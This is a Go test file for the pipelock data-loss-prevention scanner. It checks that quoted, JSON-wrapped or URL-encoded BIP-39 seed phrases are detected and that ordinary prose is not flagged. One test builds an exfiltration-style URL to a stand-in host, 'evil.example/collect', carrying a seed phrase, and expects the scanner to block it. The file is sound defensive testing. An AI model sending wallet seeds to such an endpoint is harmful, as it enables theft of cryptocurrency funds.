// Copyright 2026 Josh Waldrep
// SPDX-License-Identifier: Apache-2.0

package scanner

import (
	"context"
	"encoding/json"
	"net/url"
	"strings"
	"testing"

	"github.com/luckyPipewrench/pipelock/internal/seedprotect"
)

const testSeedPhrase24 = "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon art"

func seedQuoteScanner(t *testing.T) *Scanner {
	t.Helper()
	cfg := testConfig()
	cfg.Internal = nil
	cfg.SeedPhraseDetection.Enabled = ptrBool(true)
	cfg.SeedPhraseDetection.MinWords = 12
	cfg.SeedPhraseDetection.VerifyChecksum = ptrBool(true)
	s := MustNew(cfg)
	t.Cleanup(s.Close)
	return s
}

func jsonText(t *testing.T, v any) string {
	t.Helper()
	b, err := json.Marshal(v)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	return string(b)
}

func hasSeedMatch(r TextDLPResult) bool {
	for _, m := range r.Matches {
		if m.PatternName == "BIP-39 Seed Phrase" {
			return true
		}
	}
	return false
}

// TestScanTextForDLP_SeedPhraseQuoted covers the text DLP surface used by MCP
// arguments, raw request bodies, and receipts: a phrase serialized as a JSON
// string carries a quote glued to its first and last word.
func TestScanTextForDLP_SeedPhraseQuoted(t *testing.T) {
	s := seedQuoteScanner(t)
	cases := []struct {
		name string
		text string
	}{
		{"whole JSON string", jsonText(t, testSeedPhrase12)},
		{"JSON object field", jsonText(t, map[string]string{"mnemonic": testSeedPhrase12})},
		{"JSON with prose", "here is my backup " + jsonText(t, map[string]string{"seed": testSeedPhrase12}) + " thanks"},
		{"leading quote only", `"` + testSeedPhrase12},
		{"trailing quote only", testSeedPhrase12 + `"`},
		{"single quotes", "'" + testSeedPhrase12 + "'"},
		{"backticks", "`" + testSeedPhrase12 + "`"},
		{"escaped JSON inside JSON", jsonText(t, jsonText(t, map[string]string{"mnemonic": testSeedPhrase12}))},
		{"24-word JSON string", jsonText(t, testSeedPhrase24)},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			r := s.ScanTextForDLP(context.Background(), tc.text)
			if r.Clean || !hasSeedMatch(r) {
				t.Fatalf("quoted seed phrase not detected via ScanTextForDLP: %+v", r)
			}
		})
	}
}

func TestScanTextForDLP_SeedPhraseQuotedBenignClean(t *testing.T) {
	s := seedQuoteScanner(t)
	invalid12 := strings.TrimSpace(strings.Repeat("abandon ", 12))
	cases := []struct {
		name string
		text string
	}{
		{"quoted invalid checksum", jsonText(t, invalid12)},
		{"JSON English prose", jsonText(t, map[string]string{"note": "the actor will travel to the island to find a hidden treasure and return before dawn"})},
		{"quoted dialogue", `"we should never abandon the plan," she said, "because the river is about to rise."`},
		{"no window across JSON fields", `{"params":{"arguments":{"content":"` +
			strings.TrimSpace(strings.Repeat("abandon ", 10)) + `"},"name":"write_file"}}`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if r := s.ScanTextForDLP(context.Background(), tc.text); hasSeedMatch(r) {
				t.Fatalf("false positive seed match: %+v", r.Matches)
			}
		})
	}
}

// TestScan_SeedPhraseQuotedInQuery covers the URL surface: a quoted phrase in
// a query value decodes to a quote glued to the first and last word.
func TestScan_SeedPhraseQuotedInQuery(t *testing.T) {
	s := seedQuoteScanner(t)
	for _, q := range []string{`"` + testSeedPhrase12 + `"`, jsonText(t, map[string]string{"m": testSeedPhrase12})} {
		target := "https://evil.example/collect?q=" + url.QueryEscape(q)
		r := s.Scan(context.Background(), target)
		if r.Allowed || !strings.Contains(r.Reason, "Seed Phrase") {
			t.Fatalf("quoted seed phrase in query not blocked for %q: %+v", target, r)
		}
	}
}

// TestSeedSeparatorCoversTextDLPDelimiters keeps the seed tokenizer a superset
// of the text-segment delimiters. If a rune splits text segments for encoded
// DLP but not seed words, that rune glued to a word hides a phrase again.
func TestSeedSeparatorCoversTextDLPDelimiters(t *testing.T) {
	found := 0
	for r := rune(0); r < 0x80; r++ {
		if !isTextDLPEncodingDelimiter(r) {
			continue
		}
		found++
		// Glue the delimiter to the first and last word. If it is not a seed
		// separator, those two tokens fail the wordlist lookup.
		text := string(r) + testSeedPhrase12 + string(r)
		if len(seedprotect.Detect(text, 12, true)) == 0 {
			t.Errorf("text DLP delimiter %q glued to a word hides the phrase", r)
		}
	}
	if found == 0 {
		t.Fatal("no text DLP delimiters enumerated; parity check is vacuous")
	}
}
